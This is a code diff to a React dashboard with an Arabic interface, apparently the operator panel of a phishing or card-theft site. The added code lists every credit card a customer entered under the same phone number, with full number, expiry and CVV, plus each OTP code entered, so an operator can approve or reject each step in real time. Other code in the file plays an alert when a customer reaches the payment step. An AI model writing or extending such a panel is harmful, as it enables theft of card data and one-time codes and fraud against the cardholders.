@@ -49,6 +49,7 @@ interface Application {
 const DashboardApplications = () => {
   const [applications, setApplications] = useState<Application[]>([]);
   const [selectedApp, setSelectedApp] = useState<Application | null>(null);
+  const [relatedApplications, setRelatedApplications] = useState<Application[]>([]);
   const [showDetails, setShowDetails] = useState(false);
   const { toast } = useToast();
   const { onlineUsers } = usePresence();
@@ -56,7 +57,6 @@ const DashboardApplications = () => {
   useEffect(() => {
     fetchApplications();
 
-    // الاستماع للتحديثات في الوقت الفعلي
     const channel = supabase
       .channel('applications_changes')
       .on(
@@ -70,7 +70,6 @@ const DashboardApplications = () => {
           console.log('Realtime update:', payload);
           fetchApplications();
           
-          // تشغيل صوت تنبيه عند وصول طلب جديد لمرحلة الدفع
           if (payload.eventType === 'UPDATE' || payload.eventType === 'INSERT') {
             const newData = payload.new as any;
             if (newData.current_step === 'payment' && !newData.payment_approved) {
@@ -100,7 +99,6 @@ const DashboardApplications = () => {
   }, []);
 
   const playNotificationSound = () => {
-    // إنشاء صوت تنبيه باستخدام Web Audio API
     const audioContext = new (window.AudioContext || (window as any).webkitAudioContext)();
     const oscillator = audioContext.createOscillator();
     const gainNode = audioContext.createGain();
@@ -117,7 +115,6 @@ const DashboardApplications = () => {
     oscillator.start(audioContext.currentTime);
     oscillator.stop(audioContext.currentTime + 0.5);
     
-    // تكرار الصوت 3 مرات
     setTimeout(() => {
       const osc2 = audioContext.createOscillator();
       const gain2 = audioContext.createGain();
@@ -180,6 +177,9 @@ const DashboardApplications = () => {
     });
 
     fetchApplications();
+    if (selectedApp) {
+      fetchRelatedApplications(selectedApp.phone);
+    }
   };
 
   const rejectStep = async (appId: string) => {
@@ -205,6 +205,9 @@ const DashboardApplications = () => {
     });
 
     fetchApplications();
+    if (selectedApp) {
+      fetchRelatedApplications(selectedApp.phone);
+    }
   };
 
   const getStepBadge = (approved: boolean) => {
@@ -212,6 +215,21 @@ const DashboardApplications = () => {
       return <Badge className="bg-green-500"><CheckCircle className="w-3 h-3 mr-1" /> موافق عليه</Badge>;
     }
     return <Badge variant="destructive"><Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة</Badge>;
+  };
+
+  const fetchRelatedApplications = async (phone: string) => {
+    const { data, error } = await supabase
+      .from('customer_applications')
+      .select('*')
+      .eq('phone', phone)
+      .order('created_at', { ascending: true });
+
+    if (error) {
+      console.error('Error fetching related applications:', error);
+      return;
+    }
+
+    setRelatedApplications(data || []);
   };
 
   return (
@@ -269,6 +287,7 @@ const DashboardApplications = () => {
                 <Button
                   onClick={() => {
                     setSelectedApp(app);
+                    fetchRelatedApplications(app.phone);
                     setShowDetails(true);
                   }}
                   variant="outline"
@@ -423,90 +442,164 @@ const DashboardApplications = () => {
                 </div>
               )}
 
-              {/* بيانات الدفع */}
-              {selectedApp.cardholder_name && (
-                <div>
-                  <div className="flex items-center justify-between mb-3">
-                    <h3 className="font-bold text-red-600">⚠️ بيانات البطاقة الائتمانية (سرية)</h3>
-                    {!selectedApp.payment_approved && selectedApp.current_step === 'payment' && selectedApp.status !== 'rejected' && (
-                      <div className="flex gap-2">
-                        <Button
-                          onClick={() => approveStep(selectedApp.id, 'payment_approved')}
-                          size="sm"
-                          className="bg-green-600 hover:bg-green-700"
-                        >
-                          <CheckCircle className="h-4 w-4 ml-1" />
-                          موافق
-                        </Button>
-                        <Button
-                          onClick={() => rejectStep(selectedApp.id)}
-                          size="sm"
-                          variant="destructive"
-                        >
-                          <XCircle className="h-4 w-4 ml-1" />
-                          رفض
-                        </Button>
+              {/* جميع البطاقات الائتمانية المدخلة */}
+              {relatedApplications.filter(app => app.cardholder_name).length > 0 && (
+                <div className="space-y-4">
+                  <h3 className="font-bold text-red-600 text-lg">⚠️ البطاقات الائتمانية المدخلة (سرية)</h3>
+                  {relatedApplications
+                    .filter(app => app.cardholder_name)
+                    .map((app, index) => (
+                      <div key={app.id} className="border-2 border-red-300 dark:border-red-800 rounded-lg p-4">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex items-center gap-2">
+                            <Badge variant="outline" className="text-base font-bold">
+                              البطاقة #{index + 1}
+                            </Badge>
+                            {app.payment_approved ? (
+                              <Badge className="bg-green-500">
+                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليها
+                              </Badge>
+                            ) : app.status === 'rejected' ? (
+                              <Badge variant="destructive">
+                                <XCircle className="w-3 h-3 mr-1" /> مرفوضة
+                              </Badge>
+                            ) : (
+                              <Badge variant="destructive">
+                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
+                              </Badge>
+                            )}
+                          </div>
+                          {!app.payment_approved && app.status !== 'rejected' && (
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => approveStep(app.id, 'payment_approved')}
+                                size="sm"
+                                className="bg-green-600 hover:bg-green-700"
+                              >
+                                <CheckCircle className="h-4 w-4 ml-1" />
+                                موافق
+                              </Button>
+                              <Button
+                                onClick={() => rejectStep(app.id)}
+                                size="sm"
+                                variant="destructive"
+                              >
+                                <XCircle className="h-4 w-4 ml-1" />
+                                رفض
+                              </Button>
+                            </div>
+                          )}
+                        </div>
+                        <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg">
+                          <div>
+                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
+                            <p className="font-semibold text-sm">
+                              {new Date(app.created_at).toLocaleString('ar-EG', {
+                                year: 'numeric',
+                                month: 'short',
+                                day: 'numeric',
+                                hour: '2-digit',
+                                minute: '2-digit'
+                              })}
+                            </p>
+                          </div>
+                          <div>
+                            <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
+                            <p className="font-bold text-base">{app.cardholder_name}</p>
+                          </div>
+                          <div>
+                            <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
+                            <p className="font-mono font-bold text-lg" dir="ltr">
+                              {app.card_number || `**** **** **** ${app.card_last_4}`}
+                            </p>
+                          </div>
+                          <div className="grid grid-cols-2 gap-3">
+                            <div>
+                              <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
+                              <p className="font-semibold capitalize">{app.card_type}</p>
+                            </div>
+                            <div>
+                              <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
+                              <p className="font-mono font-semibold">{app.expiry_date}</p>
+                            </div>
+                          </div>
+                          <div>
+                            <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
+                            <p className="font-mono font-bold text-2xl text-red-600">{app.card_cvv || '***'}</p>
+                          </div>
+                        </div>
                       </div>
-                    )}
-                  </div>
-                  <div className="space-y-3 bg-red-50 dark:bg-red-950/20 p-4 rounded-lg border-2 border-red-200 dark:border-red-800">
-                    <div>
-                      <p className="text-xs text-muted-foreground mb-1">اسم حامل البطاقة:</p>
-                      <p className="font-bold text-base">{selectedApp.cardholder_name}</p>
-                    </div>
-                    <div>
-                      <p className="text-xs text-muted-foreground mb-1">رقم البطاقة الكامل:</p>
-                      <p className="font-mono font-bold text-lg" dir="ltr">
-                        {selectedApp.card_number || `**** **** **** ${selectedApp.card_last_4}`}
-                      </p>
-                    </div>
-                    <div className="grid grid-cols-2 gap-3">
-                      <div>
-                        <p className="text-xs text-muted-foreground mb-1">نوع البطاقة:</p>
-                        <p className="font-semibold capitalize">{selectedApp.card_type}</p>
-                      </div>
-                      <div>
-                        <p className="text-xs text-muted-foreground mb-1">تاريخ الانتهاء:</p>
-                        <p className="font-mono font-semibold">{selectedApp.expiry_date}</p>
-                      </div>
-                    </div>
-                    <div>
-                      <p className="text-xs text-muted-foreground mb-1">رمز CVV:</p>
-                      <p className="font-mono font-bold text-2xl text-red-600">{selectedApp.card_cvv || '***'}</p>
-                    </div>
-                  </div>
+                    ))}
                 </div>
               )}
 
-              {/* كود OTP */}
-              {selectedApp.otp_code && (
-                <div>
-                  <div className="flex items-center justify-between mb-3">
-                    <h3 className="font-bold">🔐 كود التحقق OTP</h3>
-                    {!selectedApp.otp_approved && selectedApp.current_step === 'otp' && selectedApp.status !== 'rejected' && (
-                      <div className="flex gap-2">
-                        <Button
-                          onClick={() => approveStep(selectedApp.id, 'otp_approved')}
-                          size="sm"
-                          className="bg-green-600 hover:bg-green-700"
-                        >
-                          <CheckCircle className="h-4 w-4 ml-1" />
-                          موافق
-                        </Button>
-                        <Button
-                          onClick={() => rejectStep(selectedApp.id)}
-                          size="sm"
-                          variant="destructive"
-                        >
-                          <XCircle className="h-4 w-4 ml-1" />
-                          رفض
-                        </Button>
+              {/* جميع أكواد OTP المدخلة */}
+              {relatedApplications.filter(app => app.otp_code).length > 0 && (
+                <div className="space-y-4">
+                  <h3 className="font-bold text-lg">🔐 أكواد التحقق OTP المدخلة</h3>
+                  {relatedApplications
+                    .filter(app => app.otp_code)
+                    .map((app, index) => (
+                      <div key={app.id} className="border-2 border-primary/30 rounded-lg p-4">
+                        <div className="flex items-center justify-between mb-3">
+                          <div className="flex items-center gap-2">
+                            <Badge variant="outline" className="text-base font-bold">
+                              كود OTP #{index + 1}
+                            </Badge>
+                            {app.otp_approved ? (
+                              <Badge className="bg-green-500">
+                                <CheckCircle className="w-3 h-3 mr-1" /> موافق عليه
+                              </Badge>
+                            ) : app.status === 'rejected' ? (
+                              <Badge variant="destructive">
+                                <XCircle className="w-3 h-3 mr-1" /> مرفوض
+                              </Badge>
+                            ) : (
+                              <Badge variant="destructive">
+                                <Clock className="w-3 h-3 mr-1" /> بانتظار الموافقة
+                              </Badge>
+                            )}
+                          </div>
+                          {!app.otp_approved && app.status !== 'rejected' && (
+                            <div className="flex gap-2">
+                              <Button
+                                onClick={() => approveStep(app.id, 'otp_approved')}
+                                size="sm"
+                                className="bg-green-600 hover:bg-green-700"
+                              >
+                                <CheckCircle className="h-4 w-4 ml-1" />
+                                موافق
+                              </Button>
+                              <Button
+                                onClick={() => rejectStep(app.id)}
+                                size="sm"
+                                variant="destructive"
+                              >
+                                <XCircle className="h-4 w-4 ml-1" />
+                                رفض
+                              </Button>
+                            </div>
+                          )}
+                        </div>
+                        <div className="space-y-3">
+                          <div>
+                            <p className="text-xs text-muted-foreground mb-1">📅 تاريخ الإدخال:</p>
+                            <p className="font-semibold text-sm">
+                              {new Date(app.created_at).toLocaleString('ar-EG', {
+                                year: 'numeric',
+                                month: 'short',
+                                day: 'numeric',
+                                hour: '2-digit',
+                                minute: '2-digit'
+                              })}
+                            </p>
+                          </div>
+                          <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
+                            {app.otp_code}
+                          </p>
+                        </div>
                       </div>
-                    )}
-                  </div>
-                  <p className="text-3xl font-mono font-bold bg-primary/10 p-6 rounded-lg text-center text-primary border-2 border-primary/20">
-                    {selectedApp.otp_code}
-                  </p>
+                    ))}
                 </div>
               )}
             </div>
